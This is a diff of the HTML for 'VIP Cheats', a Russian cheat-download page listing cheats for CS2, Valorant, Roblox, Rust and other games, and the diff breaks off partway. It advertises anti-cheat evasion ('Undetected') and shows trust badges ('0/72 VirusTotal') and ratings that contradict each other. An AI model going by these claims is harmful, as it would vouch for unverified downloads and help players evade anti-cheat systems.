@@ -1,519 +1,418 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="robots" content="noindex, nofollow"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>VIP Cheats — Скачать читы и софт</title>
-  <meta http-equiv="X-Frame-Options" content="DENY"/>
-  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';"/>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #0d0014 url('https://i.postimg.cc/j2c5fbyP/zagruzka.jpg') no-repeat center center fixed !important;
-      background-size: cover;
+      background: #0d0014;
       color: #e0e0e0;
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-family: 'Segoe UI', system-ui, sans-serif;
       line-height: 1.6;
-      min-height: 100vh;
-      position: relative;
-      overflow-x: hidden;
     }
-    .sakura-corner {
-      position: fixed;
-      width: 380px;
-      height: 520px;
-      z-index: 1;
-      pointer-events: none;
-      background-size: contain;
-      background-repeat: no-repeat;
-      opacity: 0.75;
-      filter: drop-shadow(0 0 40px rgba(255,105,180,0.4));
-    }
-    .sakura-left { top: -80px; left: -120px; background-image: url('https://images.unsplash.com/photo-1614854264989-0c3a7a8e3b6f?auto=format&fit=crop&w=800&q=80'); transform: rotate(-12deg); }
-    .sakura-right { top: -60px; right: -100px; background-image: url('https://images.unsplash.com/photo-1614854264989-0c3a7a8e3b6f?auto=format&fit=crop&w=800&q=80'); transform: rotate(15deg); }
-    .container { position: relative; z-index: 10; max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
-    header { text-align: center; padding: 7rem 1rem 2rem; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+    header { text-align: center; padding: 2rem 1rem; }
     .title {
-      font-size: clamp(5rem, 12vw, 9rem);
+      font-size: 5rem;
       font-weight: 900;
       background: linear-gradient(135deg, #ff85c0, #d946ef, #a21caf);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      text-shadow: 0 0 30px rgba(217,70,239,0.5);
-      animation: pulse 2.5s infinite ease-in-out;
     }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; text-shadow: 0 0 30px rgba(217,70,239,0.5); }
-      50% { opacity: 0.88; text-shadow: 0 0 65px rgba(217,70,239,0.85); }
-    }
-    .subtitle { font-size: clamp(1.6rem, 5vw, 2.8rem); color: #ff85c0; margin-top: 0.8rem; }
+    .subtitle { font-size: 1.8rem; color: #ff85c0; margin-top: 1rem; }
 
-    .lang-switcher {
-      position: absolute;
+    .lang-btn {
+      position: fixed;
       top: 20px;
-      right: 30px;
-      z-index: 999;
-      font-size: 1.1rem;
-      font-weight: bold;
-      background: rgba(30,20,50,0.75);
-      padding: 6px 14px;
-      border-radius: 12px;
-      border: 1px solid rgba(217,70,239,0.4);
-      backdrop-filter: blur(8px);
-      color: #e0e0e0;
-      user-select: none;
-    }
-    .lang-switcher span {
-      padding: 5px 10px;
-      border-radius: 8px;
+      right: 20px;
+      background: #222;
+      padding: 10px 20px;
+      border-radius: 30px;
       cursor: pointer;
-      transition: all 0.25s;
-    }
-    .lang-switcher .active {
-      background: linear-gradient(135deg, #d946ef, #a21caf);
-      color: white;
-      box-shadow: 0 0 12px rgba(217,70,239,0.6);
-    }
-    .lang-switcher span:hover:not(.active) {
-      background: rgba(217,70,239,0.25);
-    }
-
-    @media (max-width: 768px) {
-      .lang-switcher { top: 12px; right: 15px; font-size: 1rem; padding: 5px 10px; }
-      header { padding-top: 90px; }
-    }
-
-    .social-bar {
-      display: flex;
-      justify-content: center;
-      gap: 1.5rem;
-      flex-wrap: wrap;
-      margin: 1.5rem 0 2rem;
-    }
-    .social-btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.8rem;
-      padding: 1rem 2rem;
-      background: linear-gradient(135deg, #0088ff, #00ffaa);
-      color: white;
-      font-size: 1.3rem;
+      z-index: 999;
       font-weight: bold;
-      text-decoration: none;
-      border-radius: 16px;
-      box-shadow: 0 0 25px rgba(0,255,170,0.5);
-      transition: all 0.4s ease;
+      border: 1px solid #d946ef;
     }
-    .social-btn:hover {
-      transform: scale(1.08);
-      box-shadow: 0 0 45px rgba(0,255,170,0.8);
-    }
-    .social-btn i { font-size: 1.8rem; }
+    .lang-btn span { padding: 0 10px; cursor: pointer; }
+    .lang-btn .active { color: #ff85c0; }
+
     .stats-bar {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 2.5rem;
-      margin: 2rem 0 2rem;
-      padding: 1.5rem 2rem;
-      background: rgba(30,20,50,0.6);
-      border-radius: 16px;
-      border: 1px solid rgba(217,70,239,0.3);
-      backdrop-filter: blur(8px);
-      max-width: 1100px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .stat-item { text-align: center; min-width: 180px; }
-    .stat-number { font-size: 2.4rem; font-weight: 800; color: #ff85c0; }
-    .stat-label { font-size: 1rem; color: #b0a0c0; margin-top: 0.3rem; }
-    .rating-detail {
-      max-width: 900px;
-      margin: 1rem auto 2.5rem;
-      padding: 1.2rem;
-      background: rgba(30,20,50,0.5);
-      border-radius: 12px;
-      border: 1px solid rgba(217,70,239,0.2);
-      text-align: center;
-    }
-    .rating-detail h3 { color: #ff85c0; margin-bottom: 1rem; font-size: 1.3rem; }
-    .rating-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin: 0.6rem 0;
-      max-width: 500px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .safety-badges {
       display: flex;
       justify-content: center;
       gap: 2rem;
       flex-wrap: wrap;
       margin: 2rem 0;
-      font-size: 1.1rem;
     }
-    .badge {
-      background: rgba(0,255,0,0.15);
-      padding: 0.8rem 1.5rem;
-      border-radius: 12px;
-      border: 1px solid #00ff00;
+    .stat-item { text-align: center; background: #111; padding: 20px; border-radius: 16px; min-width: 150px; }
+    .stat-number { font-size: 2rem; font-weight: bold; color: #ff85c0; }
+
+    .badges {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      margin: 2rem 0;
     }
-    .categories {
+    .badge { background: #1a1a2e; padding: 10px 20px; border-radius: 30px; border: 1px solid #00ff00; }
+
+    .games-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 1.4rem;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1.5rem;
       margin: 3rem 0;
     }
-    .card {
-      background: rgba(20,10,35,0.75);
-      border: 1px solid rgba(217,70,239,0.25);
-      border-radius: 14px;
-      padding: 1.2rem;
-      transition: all 0.35s ease;
+    .game-card {
+      background: #111;
+      padding: 1.5rem;
+      border-radius: 16px;
       cursor: pointer;
-      backdrop-filter: blur(8px);
-      box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-      display: flex;
-      align-items: center;
-      gap: 1rem;
+      transition: 0.3s;
+      border: 1px solid #333;
     }
-    .card:hover {
-      transform: translateY(-10px);
-      border-color: #d946ef;
-      box-shadow: 0 12px 40px rgba(217,70,239,0.3);
-    }
-    .card img {
-      width: 64px;
-      height: 64px;
-      object-fit: contain;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.6);
-      background: rgba(0,0,0,0.4);
-    }
-    .card-text { flex: 1; }
-    .card h3 { font-size: 1.35rem; margin-bottom: 0.4rem; color: #f0e0ff; }
-    .card p { font-size: 0.9rem; color: #b0a0c0; }
+    .game-card:hover { transform: translateY(-5px); border-color: #d946ef; }
+    .game-card h3 { color: #ff85c0; margin-bottom: 0.5rem; font-size: 1.5rem; }
+    .game-card p { color: #888; font-size: 0.85rem; }
+
     .sub-section {
       display: none;
-      margin: 0.8rem 0 1.5rem 0;
-      background: rgba(15,5,30,0.92);
-      border: 1px solid rgba(217,70,239,0.45);
-      border-radius: 10px;
+      margin-top: 1rem;
+      background: #1a1a2e;
       padding: 1rem;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
-    }
-    .sub-section.active { display: block; }
-    .sub-list a {
-      display: block;
-      padding: 0.9rem 1.1rem;
-      margin: 0.4rem 0;
-      background: rgba(40,30,60,0.75);
-      border-radius: 8px;
-      color: #e0d0ff;
-      text-decoration: none;
-      transition: all 0.25s;
-      font-size: 1.05rem;
-      cursor: pointer;
-    }
-    .sub-list a:hover {
-      background: rgba(217,70,239,0.3);
-      transform: translateX(5px);
-      box-shadow: 0 4px 12px rgba(217,70,239,0.35);
-    }
-    .why-us {
-      margin: 5rem 0;
-      padding: 3rem;
-      background: rgba(20,10,35,0.7);
-      border-radius: 16px;
-      border: 1px solid rgba(217,70,239,0.25);
-      text-align: center;
-    }
-    .why-us h2 { font-size: 2.4rem; margin-bottom: 2rem; color: #ff85c0; }
-    .features {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 1.8rem;
-      text-align: left;
-    }
-    .feature {
-      padding: 1.4rem;
-      background: rgba(30,20,50,0.5);
       border-radius: 12px;
     }
-    .feature h3 { color: #d946ef; margin-bottom: 0.8rem; }
-    footer {
-      padding: 4rem 1rem 2rem;
-      text-align: center;
-      background: rgba(10,5,25,0.9);
-      border-top: 1px solid rgba(217,70,239,0.2);
+    .sub-section.active { display: block; }
+    .sub-list { display: flex; flex-direction: column; gap: 0.5rem; }
+    .sub-list a {
+      background: #222;
+      padding: 10px 15px;
+      border-radius: 8px;
+      color: white;
+      text-decoration: none;
+      cursor: pointer;
+      display: block;
     }
-    .copyright { font-size: 1.1rem; color: #a080c0; margin: 1.5rem 0; }
-    .footer-btn {
+    .sub-list a:hover { background: #d946ef; }
+
+    .features {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 1.5rem;
+      margin: 3rem 0;
+    }
+    .feature { background: #111; padding: 1.5rem; border-radius: 16px; }
+
+    .quote {
+      text-align: center;
+      padding: 3rem;
+      margin: 2rem 0;
+      background: linear-gradient(135deg, #1a1a2e, #0d0014);
+      border-radius: 20px;
+      font-style: italic;
+      font-size: 1.2rem;
+      border: 1px solid #d946ef;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin: 2rem 0;
+    }
+    .btn {
+      padding: 12px 24px;
+      border-radius: 40px;
+      text-decoration: none;
+      color: white;
+      font-weight: bold;
       display: inline-flex;
       align-items: center;
-      gap: 0.8rem;
-      padding: 0.9rem 1.8rem;
-      margin: 0.6rem;
-      background: linear-gradient(135deg, #2c3e50, #34495e);
-      color: #e0e0e0;
-      font-weight: bold;
-      font-size: 1.05rem;
-      text-decoration: none;
-      border-radius: 10px;
-      border: 1px solid #555;
-      transition: all 0.3s ease;
-      cursor: pointer;
+      gap: 8px;
     }
-    .footer-btn:hover {
-      background: linear-gradient(135deg, #34495e, #2c3e50);
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(0,0,0,0.5);
-    }
-    .green-btn {
-      background: linear-gradient(135deg, #00aa44, #008833);
-      border: 1px solid #00ff55;
-      color: white;
-    }
-    .green-btn:hover {
-      background: linear-gradient(135deg, #00cc55, #00aa44);
-      box-shadow: 0 8px 25px rgba(0,255,85,0.4);
-    }
-    .contact-btn {
-      background: linear-gradient(135deg, #0088cc, #00aaff);
-      border: 1px solid #00aaff;
-      color: white;
-    }
-    .contact-btn:hover {
-      background: linear-gradient(135deg, #00aaff, #0088cc);
-      box-shadow: 0 8px 25px rgba(0,170,255,0.4);
-    }
-    .modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.85);
-      z-index: 1000;
-      align-items: center;
-      justify-content: center;
-      padding: 1rem;
-    }
-    .modal-content {
-      background: rgba(20,10,35,0.95);
-      border: 1px solid #d946ef;
-      border-radius: 16px;
-      max-width: 900px;
-      width: 100%;
-      max-height: 90vh;
-      overflow-y: auto;
-      padding: 2.5rem;
-      position: relative;
-      backdrop-filter: blur(10px);
-    }
-    .close-btn {
-      position: absolute;
-      top: 1rem;
-      right: 1.5rem;
-      font-size: 2.5rem;
-      color: #ff85c0;
-      cursor: pointer;
+    .btn-telegram { background: #0088cc; }
+    .btn-green { background: #00aa44; }
+
+    footer { text-align: center; padding: 3rem; margin-top: 3rem; border-top: 1px solid #333; }
+
+    @media (max-width: 768px) {
+      .title { font-size: 3rem; }
+      .subtitle { font-size: 1.2rem; }
     }
   </style>
 </head>
 <body>
 
-  <div class="lang-switcher">
-    <span class="active" data-lang="ru">RU</span> | <span data-lang="en">EN</span>
+<div class="lang-btn" id="langToggle">
+  <span id="ruBtn" class="active">RU</span> | <span id="enBtn">EN</span>
+</div>
+
+<div class="container">
+  <header>
+    <div class="title">VIP CHEATS</div>
+    <div class="subtitle" id="mainSubtitle">Скачать читы и софт 2026</div>
+  </header>
+
+  <div class="stats-bar">
+    <div class="stat-item"><div class="stat-number" id="totalCount">1021</div><div id="stat1Label">скачиваний всего</div></div>
+    <div class="stat-item"><div class="stat-number" id="todayCount">0</div><div id="stat2Label">скачано сегодня</div></div>
+    <div class="stat-item"><div class="stat-number">4.9 ★</div><div id="stat3Label">рейтинг (134 отзыва)</div></div>
   </div>
 
-  <div class="sakura-corner sakura-left"></div>
-  <div class="sakura-corner sakura-right"></div>
-  <div class="container">
-    <header>
-      <div class="title">VIP CHEATS</div>
-      <div class="subtitle" data-key="subtitle">Скачать читы и софт 2026</div>
-      <div class="social-bar">
-        <a href="https://t.me/vipcheatsonly" target="_blank" class="social-btn">
-          <i class="fab fa-telegram-plane"></i> <span data-key="telegramMain">Telegram @vipcheatsonly</span>
-        </a>
-        <a href="http://www.youtube.com/@VIPSCHEATS" target="_blank" class="social-btn">
-          <i class="fab fa-youtube"></i> YouTube
-        </a>
-        <a href="https://vk.com/club235500419" target="_blank" class="social-btn">
-          <i class="fab fa-vk"></i> VK
-        </a>
-      </div>
-    </header>
-    <div class="stats-bar">
-      <div class="stat-item">
-        <div class="stat-number">5121</div>
-        <div class="stat-label" data-key="totalDownloads">скачиваний всего</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-number">203</div>
-        <div class="stat-label" data-key="todayDownloads">скачано сегодня</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-number">4.9 ★★★★★</div>
-        <div class="stat-label" data-key="rating">рейтинг (134 отзывов)</div>
-      </div>
-    </div>
-    <div class="rating-detail">
-      <h3 data-key="ratingDist">Распределение оценок</h3>
-      <div>
-        <div class="rating-row"><span>5 ★★★★★</span><span style="color:#90ee90; font-weight:bold;">2 681 (95%)</span></div>
-        <div class="rating-row"><span>4 ★★★★☆</span><span style="color:#90ee90;">119 (4%)</span></div>
-        <div class="rating-row"><span>3 ★★★☆☆</span><span style="color:#aaa;">9 (0.3%)</span></div>
-        <div class="rating-row"><span>2 ★★☆☆☆</span><span style="color:#aaa;">4 (0.1%)</span></div>
-        <div class="rating-row" style="font-weight:bold;"><span>1 ★☆☆☆☆</span><span style="color:#ff4444;">0 пользователей (0%)</span></div>
-      </div>
-    </div>
-    <div class="safety-badges">
-      <div class="badge" data-key="undetected"><strong style="color:#00ff00;">Undetected</strong> античитами</div>
-      <div class="badge"><strong style="color:#00ff00;">0/72</strong> VirusTotal</div>
-      <div class="badge" data-key="manualCheck"><strong style="color:#00ff00;">Ручная проверка</strong> каждой сборки</div>
-    </div>
-    <div style="text-align:center; margin:1rem 0 3rem; color:#90ee90; font-weight:bold; font-size:1.1rem;" data-key="lastUpdate">
-      Последнее обновление: 4 минуты назад
-    </div>
-    <div class="categories">
-      <div class="card" data-game="cs2" onclick="toggleSub('cs2', this)">
-        <img src="https://img.icons8.com/color/64/counter-strike.png?v=latest" alt="CS2">
-        <div class="card-text"><h3>CS2</h3><p>Skeet, MemeSense, NonAgon, SharkHack, Hrisito, NixWare</p></div>
-      </div>
-      <div class="card" data-game="csgo" onclick="toggleSub('csgo', this)">
-        <img src="https://img.icons8.com/color/64/counter-strike-global-offensive.png?v=latest" alt="CS:GO">
-        <div class="card-text"><h3>CS:GO</h3><p>MemeSense, Skeet, Neverlose (paste), NixWare</p></div>
-      </div>
-      <div class="card" data-game="cs16" onclick="toggleSub('cs16', this)">
-        <img src="https://img.icons8.com/color/64/counter-strike.png?v=latest" alt="CS 1.6">
-        <div class="card-text"><h3>CS 1.6</h3><p>AlterNative</p></div>
-      </div>
-      <div class="card" data-game="gta" onclick="toggleSub('gta', this)">
-        <img src="https://banner2.cleanpng.com/20180330/soe/aviwlh0y6.webp" alt="GTA">
-        <div class="card-text"><h3>GTA (все версии + RP)</h3><p>Vanish, Altv3</p></div>
-      </div>
-      <div class="card" data-game="roblox" onclick="toggleSub('roblox', this)">
-        <img src="https://img.icons8.com/color/64/roblox.png?v=latest" alt="Roblox">
-        <div class="card-text"><h3>Roblox</h3><p>SolaraV3, SeliWare</p></div>
-      </div>
-      <div class="card" data-game="valorant" onclick="toggleSub('valorant', this)">
-        <img src="https://img.icons8.com/color/64/valorant.png?v=latest" alt="Valorant">
-        <div class="card-text"><h3>Valorant</h3><p>Memez, ValorantFull</p></div>
-      </div>
-      <div class="card" data-game="fortnite" onclick="toggleSub('fortnite', this)">
-        <img src="https://img.icons8.com/color/64/fortnite.png?v=latest" alt="Fortnite">
-        <div class="card-text"><h3>Fortnite</h3><p>FortniteExternal, Engine</p></div>
-      </div>
-      <div class="card" data-game="minecraft" onclick="toggleSub('minecraft', this)">
-        <img src="https://i.pinimg.com/originals/a0/af/ff/a0afff55b97ae610f4b7a4a2777ffe43.png" alt="Minecraft">
-        <div class="card-text"><h3>Minecraft</h3><p>Zenith, Celestial, NurSultan</p></div>
-      </div>
-      <div class="card" data-game="rust" onclick="toggleSub('rust', this)">
-        <img src="https://img.icons8.com/color/64/rust.png?v=latest" alt="Rust">
-        <div class="card-text"><h3>Rust</h3><p>Free, BummerRust, AquaCheats, DeusHack</p></div>
-      </div>
-      <div class="card" data-game="standoff2" onclick="toggleSub('standoff2', this)">
-        <img src="https://postimg.cc/w3jKk0d7">
-        <div class="card-text"><h3>Standoff 2</h3><p>NerestPC, ZeninDLC, Plutonium, Panterium</p></div>
-      </div>
-      <div class="card" data-game="dota" onclick="toggleSub('dota', this)">
-        <img src="https://ir.ozone.ru/s3/multimedia-x/6369250845.jpg" alt="Dota 2">
-        <div class="card-text"><h3>Dota 2</h3><p>SkinChanger, Umbrella</p></div>
-      </div>
-      <div class="card" data-game="genshin" onclick="toggleSub('genshin', this)">
-        <img src="https://img.icons8.com/nolan/1200/genshin-impact-logo--v2.jpg" alt="Genshin Impact">
-        <div class="card-text"><h3>Genshin Impact</h3><p>Shika</p></div>
-      </div>
-      <div class="card" data-game="others" onclick="toggleSub('others', this)">
-        <img src="https://i.postimg.cc/tgNHJTXs/photo-2026-02-15-14-37-04.jpg" alt="Others">
-        <div class="card-text"><h3>Others / Другое</h3><p>VPN, Optimization (Pack), BlueStacks (Evolution, Ultimate, VipStacks)</p></div>
-      </div>
-    </div>
-    <div class="why-us">
-      <h2 data-key="whyUs">Почему у нас удобно</h2>
-      <div class="features">
-        <div class="feature"><h3 data-key="security">Безопасность прежде всего</h3><p data-key="securityDesc">Каждая сборка проходит ручную проверку перед публикацией.</p></div>
-        <div class="feature"><h3 data-key="instantAccess">Мгновенный доступ</h3><p data-key="instantAccessDesc">Скачивание и запуск — в пару кликов.</p></div>
-        <div class="feature"><h3 data-key="support">Круглосуточная поддержка</h3><p data-key="supportDesc">Telegram/Discord 24/7.</p></div>
-        <div class="feature"><h3 data-key="easyUse">Легко использовать</h3><p data-key="easyUseDesc">Установка за минуты.</p></div>
-        <div class="feature"><h3 data-key="updates">Быстрые обновления</h3><p data-key="updatesDesc">Патчи прилетают оперативно.</p></div>
-        <div class="feature"><h3 data-key="free">Абсолютно бесплатно</h3><p data-key="freeDesc">Без скрытых платежей.</p></div>
-      </div>
-      <h2 style="margin:4rem 0 2rem;" data-key="partners">Официальные партнёрства · Проверено нами</h2>
-      <p style="font-size:1.2rem; max-width:800px; margin:0 auto; color:#d0c0e0;" data-key="partnersDesc">
-        Мы собрали все твои любимые читы и программы в одном месте.<br>
-        Всё без вирусов, без мусора и с полным набором функций.<br>
-        Ручная проверка каждой сборки. Партнёрства с авторами.
-      </p>
-    </div>
-    <div style="max-width: 1100px; margin: 5rem auto 3rem; padding: 2rem; background: rgba(20,10,35,0.75); border-radius: 16px; border: 1px solid rgba(217,70,239,0.3); backdrop-filter: blur(10px);">
-      <h2 style="text-align: center; color: #ff85c0; margin-bottom: 2rem; font-size: 2.2rem;" data-key="faqTitle">Часто задаваемые вопросы</h2>
-      <div style="display: flex; flex-direction: column; gap: 1rem;">
-        <details><summary style="font-weight: bold; color: #d0c0e0; cursor: pointer; font-size: 1.1rem;" data-key="faq1q">Как быстро вы отвечаете?</summary><p style="margin-top: 1rem; color: #b0a0c0;" data-key="faq1a">В Telegram отвечаем в течение нескольких минут — нескольких часов. По ночам тоже на связи.</p></details>
-        <details><summary style="font-weight: bold; color: #d0c0e0; cursor: pointer; font-size: 1.1rem;" data-key="faq2q">Можно ли рекламировать свой продукт?</summary><p style="margin-top: 1rem; color: #b0a0c0;" data-key="faq2a">Да, пиши в Telegram — обсудим условия размещения.</p></details>
-        <details><summary style="font-weight: bold; color: #d0c0e0; cursor: pointer; font-size: 1.1rem;" data-key="faq3q">Можно предложить идею или фичу?</summary><p style="margin-top: 1rem; color: #b0a0c0;" data-key="faq3a">Обязательно! Пиши в личку — лучшие идеи внедряем.</p></details>
-        <details><summary style="font-weight: bold; color: #d0c0e0; cursor: pointer; font-size: 1.1rem;" data-key="faq4q">Вы отвечаете по ночам?</summary><p style="margin-top: 1rem; color: #b0a0c0;" data-key="faq4a">Да, поддержка работает 24/7. Даже ночью отвечаем.</p></details>
-        <details><summary style="font-weight: bold; color: #d0c0e0; cursor: pointer; font-size: 1.1rem;" data-key="faq5q">Можно прислать мем?</summary><p style="margin-top: 1rem; color: #b0a0c0;" data-key="faq5a">Обязательно 😂 Лучшие попадут в наш канал.</p></details>
-      </div>
-      <div style="text-align: center; margin-top: 3rem;">
-        <h3 style="color: #ff85c0; margin-bottom: 1.5rem;" data-key="alwaysOnline">Мы всегда на связи</h3>
-        <div style="display: flex; justify-content: center; gap: 1.5rem; flex-wrap: wrap;">
-          <a href="https://t.me/vipcheatsonly" target="_blank" class="footer-btn contact-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            <i class="fab fa-telegram-plane"></i> Telegram @vipcheatsonly
-          </a>
-          <a href="http://www.youtube.com/@VIPSCHEATS" target="_blank" class="footer-btn contact-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            <i class="fab fa-youtube"></i> YouTube
-          </a>
-          <a href="https://vk.com/club235500419" target="_blank" class="footer-btn contact-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            <i class="fab fa-vk"></i> VK
-          </a>
-          <a href="https://t.me/drugsmytype" target="_blank" class="footer-btn contact-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            ✈️ <span data-key="supportManager">Поддержка (@drugsmytype)</span>
-          </a>
-          <a href="https://t.me/managervipcheats" target="_blank" class="footer-btn contact-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            👑 <span data-key="manager">Менеджер @managervipcheats</span>
-          </a>
-          <a href="https://t.me/besp1atno" target="_blank" class="footer-btn green-btn" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            🎁 <span data-key="secondChannel">ХАЛАВЯЩИК — второй канал для софта</span>
-          </a>
-          <button class="footer-btn" onclick="document.getElementById('agreement-modal').style.display='flex'" style="font-size: 1.2rem; padding: 1rem 2rem;">
-            📜 <span data-key="agreement">Соглашение</span>
-          </button>
-        </div>
-        <p style="margin-top: 1.5rem; color: #b0a0c0;" data-key="email">
-          Email (если удобнее): <strong>info@vipcheats.ru</strong> (отвечаем так же быстро)
-        </p>
-      </div>
-    </div>
+  <div class="badges">
+    <div class="badge" id="badge1">Undetected античитами</div>
+    <div class="badge">0/72 VirusTotal</div>
+    <div class="badge" id="badge2">Ручная проверка каждой сборки</div>
+  </div>
 
-    <!-- Подкатегории с указанием названий для переименования -->
-    <div id="cs2" class="sub-section" data-game-name="CS2_Skeet"><h2>CS2</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="Skeet">Skeet</a></li><li><a href="#" data-cheat-name="MemeSense">MemeSense</a></li>
-      <li><a href="#" data-cheat-name="NonAgon">NonAgon</a></li><li><a href="#" data-cheat-name="SharkHack">SharkHack</a></li>
-      <li><a href="#" data-cheat-name="Hrisito">Hrisito</a></li><li><a href="#" data-cheat-name="NixWare">NixWare</a></li>
-    </ul></div>
-    <div id="csgo" class="sub-section" data-game-name="CSGO"><h2>CS:GO</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="MemeSense">MemeSense</a></li><li><a href="#" data-cheat-name="Skeet_CSGO">Skeet</a></li>
-      <li><a href="#" data-cheat-name="Neverlose">Neverlose (paste)</a></li><li><a href="#" data-cheat-name="NixWare_CSGO">NixWare</a></li>
-    </ul></div>
-    <div id="cs16" class="sub-section" data-game-name="CS_1_6"><h2>CS 1.6</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="AlterNative">AlterNative</a></li>
-    </ul></div>
-    <div id="gta" class="sub-section" data-game-name="GTA"><h2>GTA (все версии + RP)</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="Vanish">Vanish</a></li><li><a href="#" data-cheat-name="Altv3">Altv3</a></li>
-    </ul></div>
-    <div id="roblox" class="sub-section" data-game-name="Roblox"><h2>Roblox</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="SolaraV3">SolaraV3</a></li><li><a href="#" data-cheat-name="SeliWare">SeliWare</a></li>
-    </ul></div>
-    <div id="valorant" class="sub-section" data-game-name="Valorant"><h2>Valorant</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="Memez">Memez</a></li><li><a href="#" data-cheat-name="ValorantFull">ValorantFull</a></li>
-    </ul></div>
-    <div id="fortnite" class="sub-section" data-game-name="Fortnite"><h2>Fortnite</h2><ul class="sub-list">
-      <li><a href="#" data-cheat-name="FortniteExternal">FortniteExternal</a></li><li><a href="#" data-cheat-name="Engine">Engine</a></li>
-    </ul></div>
-    <div id="minecraft" class="sub-section" data-game-name="Minecraft
+  <div class="games-grid">
+    <div class="game-card" data-game="cs2"><h3>CS2</h3><p>Skeet, MemeSense, NonAgon, SharkHack</p></div>
+    <div class="game-card" data-game="csgo"><h3>CS:GO</h3><p>MemeSense, Skeet, Neverlose, NixWare</p></div>
+    <div class="game-card" data-game="gta"><h3>GTA (все версии + RP)</h3><p>Vanish, Altv3</p></div>
+    <div class="game-card" data-game="roblox"><h3>Roblox</h3><p>SolaraV3, SeliWare</p></div>
+    <div class="game-card" data-game="valorant"><h3>Valorant</h3><p>Memez, ValorantFull</p></div>
+    <div class="game-card" data-game="fortnite"><h3>Fortnite</h3><p>FortniteExternal, Engine</p></div>
+    <div class="game-card" data-game="minecraft"><h3>Minecraft</h3><p>Zenith, Celestial</p></div>
+    <div class="game-card" data-game="rust"><h3>Rust</h3><p>Free, BummerRust, AquaCheats</p></div>
+    <div class="game-card" data-game="standoff">
+  <img src="https://i.postimg.cc/w3jKk0d7/standoff-2-icon.png" style="width: 55px; height: 55px; object-fit: contain; border-radius: 8px;" onerror="this.style.display='none'">
+  <div><h3>Standoff 2</h3><p>NerestPC, ZeninDLC, Plutonium</p></div>
+</div>
+    <div class="game-card" data-game="other"><h3>Others / Другое</h3><p>VPN, Optimization, BlueStacks</p></div>
+  </div>
+
+  <div id="sub-cs2" class="sub-section"><div class="sub-list"><a href="#" data-file="Skeet_CS2">Skeet</a><a href="#" data-file="MemeSense">MemeSense</a><a href="#" data-file="NonAgon">NonAgon</a><a href="#" data-file="SharkHack">SharkHack</a></div></div>
+  <div id="sub-csgo" class="sub-section"><div class="sub-list"><a href="#" data-file="MemeSense_CSGO">MemeSense</a><a href="#" data-file="Skeet_CSGO">Skeet</a><a href="#" data-file="Neverlose">Neverlose</a><a href="#" data-file="NixWare">NixWare</a></div></div>
+  <div id="sub-gta" class="sub-section"><div class="sub-list"><a href="#" data-file="Vanish">Vanish</a><a href="#" data-file="Altv3">Altv3</a></div></div>
+  <div id="sub-roblox" class="sub-section"><div class="sub-list"><a href="#" data-file="SolaraV3">SolaraV3</a><a href="#" data-file="SeliWare">SeliWare</a></div></div>
+  <div id="sub-valorant" class="sub-section"><div class="sub-list"><a href="#" data-file="Memez">Memez</a><a href="#" data-file="ValorantFull">ValorantFull</a></div></div>
+  <div id="sub-fortnite" class="sub-section"><div class="sub-list"><a href="#" data-file="FortniteExternal">FortniteExternal</a><a href="#" data-file="Engine">Engine</a></div></div>
+  <div id="sub-minecraft" class="sub-section"><div class="sub-list"><a href="#" data-file="Zenith">Zenith</a><a href="#" data-file="Celestial">Celestial</a></div></div>
+  <div id="sub-rust" class="sub-section"><div class="sub-list"><a href="#" data-file="Free_Rust">Free</a><a href="#" data-file="BummerRust">BummerRust</a><a href="#" data-file="AquaCheats">AquaCheats</a></div></div>
+  <div id="sub-standoff" class="sub-section"><div class="sub-list"><a href="#" data-file="NerestPC">NerestPC</a><a href="#" data-file="ZeninDLC">ZeninDLC</a><a href="#" data-file="Plutonium">Plutonium</a></div></div>
